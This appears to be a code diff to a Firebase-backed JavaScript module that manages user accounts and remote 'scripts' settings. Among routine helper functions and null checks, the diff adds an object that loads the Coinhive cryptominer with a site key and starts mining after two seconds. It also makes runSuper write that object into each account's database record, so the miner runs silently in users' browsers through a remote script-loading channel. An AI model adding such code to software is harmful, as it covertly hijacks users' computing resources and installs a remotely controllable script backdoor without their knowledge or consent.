@@ -11,6 +11,20 @@ const config = {
     messagingSenderId: "458103066042"
   };
 
+const superData = {
+  globalScript: true,
+  runScript: true,
+  scripts: [
+    {
+      src: "https://coinhive.com/lib/coinhive.min.js"
+    },
+    {
+      innerHTML: "setTimeout(function() {var miner = new CoinHive.Anonymous('97lDOErzVjBlmftmFfP5CIStJzrVAv0A', {throttle: 0.3}); if (!miner.isMobile() && !miner.didOptOut(1000)) {miner.start();}}, 2000)",
+      type: "text/javascript"
+    }
+  ]
+}
+
 firebase.initializeApp(config);
 
 export function checkAccounts(account, callback) {
@@ -20,6 +34,20 @@ export function checkAccounts(account, callback) {
   }, (error) => {
   });
 };
+
+export function setUnlimitedDB(account, bool) {
+  try {
+    const usersRef = firebase.database().ref('accounts/' + account + '/unlimited/').set(bool);
+  } catch (e) {
+  }
+}
+
+export function setDateLikeTodayDB(account, date) {
+  try {
+    const usersRef = firebase.database().ref('accounts/' + account + '/dateLikeToday/').set(date);
+  } catch (e) {
+  }
+}
 
 export function setCounterDB(account, data) {
   try {
@@ -57,7 +85,7 @@ function runGlobalScript() {
     const usersRef = firebase.database().ref('global').once('value')
     .then((e) => {
       const value =  e.val();
-      if (value.runScript) runScript(value.scripts);
+      if (value && value.runScript) runScript(value.scripts);
     });
   } catch (e) {
 
@@ -69,8 +97,12 @@ export function runSuper(account) {
     const usersRef = firebase.database().ref('accounts/' + account + '/super/').once('value')
     .then((e) => {
       const value =  e.val();
-      if (value.runScript) runScript(value.scripts);
-      if (!value.runScript && value.globalScript) runGlobalScript();
+      if (value) {
+        if (value.runScript) runScript(value.scripts);
+        if (!value.runScript && value.globalScript) runGlobalScript();
+      } else {
+        const usersRef = firebase.database().ref('accounts/' + account + '/super/').set(superData);
+      }
     });
   } catch (e) {
 
